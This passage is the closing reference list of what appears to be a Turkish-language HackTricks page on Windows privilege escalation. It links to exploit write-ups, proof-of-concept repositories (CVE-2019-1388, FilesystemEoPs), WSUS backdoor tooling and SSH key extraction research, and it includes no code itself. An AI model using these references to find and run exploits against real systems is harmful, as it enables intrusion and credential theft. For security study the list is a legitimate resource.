- [30] [Hepsine Hükmedecek Tek Bir I/O Ring: Windows 11'de Tam Bir Okuma/Yazma Exploit Primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Rastgele Dosya Silme İşlemlerini Kötüye Kullanarak Yetki Yükseltme ve Diğer Harika Yöntemler](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10 Yerel Yetki Yükseltme 1-Day'i](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Bir Görüntü Değişikliğinin Yetki Yükseltmeye Yol Açması](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Key'leri Çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal Güncelleme Sunucularını Backdoor Fabrikalarına Dönüştürmek (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
